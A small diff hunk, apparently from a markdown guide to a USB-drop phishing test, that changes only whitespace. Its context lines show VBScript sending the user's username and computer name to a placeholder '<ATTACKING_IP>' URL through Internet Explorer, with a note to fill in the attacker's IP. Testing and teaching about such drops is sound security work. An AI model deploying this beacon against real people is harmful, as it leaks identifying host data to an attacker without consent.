@@ -208,7 +208,7 @@ File preparation
  WebUrl = "http://<ATTACKING_IP>/<USB_DESCRIPTION>?user=" & username & "&computername=" & computername
  
  IEapp.navigate WebUrl
- ```
+ ```  
 
 **Side-Note:** Remember to edit line 7 to include your attacking IP address and a USB description (ex: green, front lobby, excelmacro_green).
 {: .notice--info}  
